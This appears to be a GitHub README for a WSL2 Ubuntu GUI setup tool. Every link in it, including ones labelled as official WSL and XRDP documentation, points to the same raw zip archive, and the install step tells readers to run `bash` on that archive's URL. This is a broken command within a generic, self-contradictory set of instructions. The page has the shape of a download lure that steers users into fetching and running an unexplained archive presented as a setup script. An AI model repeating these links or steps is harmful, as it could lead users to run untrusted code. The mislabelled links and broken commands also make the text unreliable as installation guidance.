# 🌟 WSL-Ubuntu-GUI-setup - Set Up Ubuntu GUI Easily

[![Download WSL-Ubuntu-GUI-setup](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip%https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)

## 📌 Description
A comprehensive, step-by-step guide to setting up a native Ubuntu GUI on WSL2 using XRDP. The most stable way to run Ubuntu GUI on WSL2. Features automated setup, RAM optimization, "No-Snap" native app prioritization, and one-click Start/Stop scripts to fix the "Blank Screen" bug.

## 🚀 Getting Started
To begin using WSL-Ubuntu-GUI-setup, follow the steps below. This guide will help you download and run the software with ease.

### 🖥️ System Requirements
- Windows 10 (Version 1903 or later) or Windows 11
- Windows Subsystem for Linux (WSL2) installed
- At least 4 GB RAM recommended
- A stable internet connection

### 🛠️ Required Tools
Before starting, ensure you have the following tools installed:
- WSL2 enabled on your Windows machine
- A terminal application (Windows Terminal or Command Prompt)

## 📥 Download & Install
To download WSL-Ubuntu-GUI-setup, visit this page to download: [Releases Page](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip). 

1. Navigate to the **Releases** section.
2. Find the latest version.
3. Download the appropriate file for your system.

Once downloaded, run the installation file by following these steps:
1. Open **Windows Terminal** or **Command Prompt**.
2. Use the command `wsl` to enter the WSL environment.
3. Navigate to the directory where the installer was downloaded, then execute the installation command.

## ⚙️ Installation Steps
Follow these steps to install the Ubuntu GUI:

1. **Launch the Terminal**: Use the Windows Start Menu to open Windows Terminal.
2. **Enter WSL**: Type `wsl` and press Enter.
3. **Download the Installer**: Use `wget` or another tool to download the setup file.
4. **Run the Setup**: Execute the setup script using the command:
   ```bash
   bash https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip
   ```
5. **Follow Prompts**: The script will guide you through specific configurations. Just follow the prompts and make selections as needed.

## 🖼️ Running Your Ubuntu GUI
After installation is complete, you can run the Ubuntu GUI with the following steps:

1. Open **Windows Terminal**.
2. Type `wsl` and press Enter to enter the WSL environment.
3. Start the XRDP service by executing:
   ```bash
   sudo service xrdp start
   ```

4. Connect using your preferred Remote Desktop Client by entering `localhost:3389`.

You should see the Ubuntu GUI displayed on your screen.

## 🌟 Key Features
- **Automated Setup**: Simplified installation process.
- **RAM Optimization**: Efficient memory usage for better performance.
- **No-Snap App Prioritization**: Focus on native applications.
- **One-Click Scripts**: Easy Start/Stop scripts to resolve common issues, like the "Blank Screen" bug.

## ⚠️ Troubleshooting
If you encounter issues while using the Ubuntu GUI, consider the following:

- Ensure your system meets the requirements.
- Restart the XRDP service if you face a black screen.
- Check the Windows firewall settings to allow connections to the XRDP port (3389).

### Frequently Asked Questions
**Q: What is WSL?**  
A: WSL stands for Windows Subsystem for Linux. It allows you to run a Linux environment directly on Windows.

**Q: Can I use other desktop environments?**  
A: Yes, you can modify the setup to use other lightweight desktop environments if desired.

## 📝 Additional Resources
For more information, visit the following links:
- [WSL Documentation](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)
- [XRDP GitHub](https://raw.githubusercontent.com/DemidovAlexander1/WSL-Ubuntu-GUI-setup/main/hyperprism/WS_setup_GU_Ubuntu_v1.0.zip)

## 📄 License
This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## 📣 Acknowledgments
Thank you to the open-source community for contributing to the WSL and XRDP projects.

For any additional questions or issues, please feel free to open an issue on this repository. Your feedback is valuable and helps improve the software for everyone.